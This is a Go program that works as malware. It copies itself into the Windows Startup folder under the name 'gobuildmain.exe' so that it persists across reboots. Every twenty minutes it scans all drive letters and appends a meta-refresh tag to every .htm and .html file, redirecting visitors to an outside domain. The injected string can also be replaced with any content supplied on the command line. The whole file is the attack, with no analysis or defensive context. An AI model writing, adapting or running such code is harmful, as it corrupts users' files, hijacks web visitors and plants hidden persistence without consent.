package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"time"
)

var ctt = ""

func appendToFile(fileName string, content string) error {
	// 以只写的模式，打开文件
	f, err := os.OpenFile(fileName, os.O_WRONLY, 0644)
	if err != nil {
		//fmt.Println("cacheFileList.yml file create failed. err: " + err.Error())
	} else {
		// 查找文件末尾的偏移量
		n, _ := f.Seek(0, os.SEEK_END)
		// 从末尾的偏移量开始写入内容
		_, err = f.WriteAt([]byte(content), n)
	}
	defer f.Close()
	return err
}

func isappend(file string) (f bool) {
	str, err := ioutil.ReadFile(file)
	if err != nil {
		return
	}
	if strings.HasSuffix(string(str), ctt) {
		return true
	}
	return
}

func GetAllFile(pathname string) error {
	rd, err := ioutil.ReadDir(pathname)
	for _, fi := range rd {
		if fi.IsDir() {
			//fmt.Print("正在查找")
			//fmt.Printf("[%s]\n", pathname+"\\"+fi.Name())
			GetAllFile(pathname + fi.Name() + "\\")
		} else {
			if strings.HasSuffix(fi.Name(), ".htm") || strings.HasSuffix(fi.Name(), ".html") {
				//fmt.Println("正在修改",pathname+"\\"+fi.Name(),"添加",ctt)
				if !isappend(pathname + "\\" + fi.Name()) {
					appendToFile(pathname+"\\"+fi.Name(), "\n"+ctt)
				}
			}
		}
	}
	return err
}

func CopyFile(dstName, srcName string) (written int64, err error) {
	src, err := os.Open(srcName)
	if err != nil {
		return
	}
	defer src.Close()
	dst, err := os.OpenFile(dstName, os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return
	}
	defer dst.Close()
	return io.Copy(dst, src)
}

func addstartup() {
	path := os.Args[0]
	fmt.Println(CopyFile(`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\gobuildmain.exe`, path))
}

func startadd() {
	pfs := "QWERTYUIOPASDFGHJKLZXCVBNM"
	for _, pf := range pfs {
		path := string(pf) + `:\`
		GetAllFile(path)
	}
}

func main() {
	flag.Parse()
	l := len(flag.Args())
	switch l {
	case 0:
		ctt = `<meta http-equiv="refresh" content="0.1;url=http://125069.com/">`
	default:
		ctt = flag.Arg(0)
	}

	addstartup()
	//fmt.Println(isappend(`E:\temp\websocket\chart\index.html`))
	//ctt="\n123456"
	for {
		startadd()
		time.Sleep(time.Second * 1200)
	}
}
